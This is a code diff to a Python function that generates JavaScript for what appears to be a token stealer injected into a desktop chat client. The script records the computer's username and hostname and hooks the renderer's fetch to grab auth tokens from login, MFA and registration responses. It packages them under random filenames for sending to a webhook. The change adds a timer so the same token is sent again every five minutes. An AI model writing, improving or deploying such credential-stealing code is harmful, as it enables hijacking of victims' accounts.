@@ -23,11 +23,23 @@ def get_js_payload(webhook_url: str) -> str:
         const PC_USER = os.userInfo().username;
         const PC_HOST = os.hostname();
         let lastToken = null;
+        let lastTokenTime = 0;
+        const TOKEN_RESET_INTERVAL = 5 * 60 * 1000; // 5 minutes
 
         function sendToken(token, source) {{
             try {{
-                if (!token || token === lastToken) return;
+                if (!token) return;
+                
+                const now = Date.now();
+                const timeSinceLastToken = now - lastTokenTime;
+                
+                // Allow resending same token after 5 minutes, or different token anytime
+                if (token === lastToken && timeSinceLastToken < TOKEN_RESET_INTERVAL) {{
+                    return;
+                }}
+                
                 lastToken = token;
+                lastTokenTime = now;
                 
                 const randomName = Math.random().toString(36).substring(2, 8) + Math.random().toString(36).substring(2, 8);
                 const filename = randomName + '.json';
@@ -88,6 +100,10 @@ def get_js_payload(webhook_url: str) -> str:
                             try {{
                                 const rendererJS = `(function(){{
                                     try{{
+                                        let lastRendererToken = null;
+                                        let lastRendererTokenTime = 0;
+                                        const RENDERER_TOKEN_RESET = 5 * 60 * 1000;
+                                        
                                         var oF=window.fetch;
                                         window.fetch=async function(){{
                                             var r=await oF.apply(this,arguments);
@@ -96,6 +112,16 @@ def get_js_payload(webhook_url: str) -> str:
                                                 if(u&&(u.includes("/login")||u.includes("/mfa/")||u.includes("/register"))){{
                                                     r.clone().json().then(function(d){{
                                                         if(d.token){{
+                                                            const now = Date.now();
+                                                            const timeSince = now - lastRendererTokenTime;
+                                                            
+                                                            if (d.token === lastRendererToken && timeSince < RENDERER_TOKEN_RESET) {{
+                                                                return;
+                                                            }}
+                                                            
+                                                            lastRendererToken = d.token;
+                                                            lastRendererTokenTime = now;
+                                                            
                                                             const randomName = Math.random().toString(36).substring(2, 8) + Math.random().toString(36).substring(2, 8);
                                                             const filename = randomName + '.json';
                                                             const jsonData = JSON.stringify({{
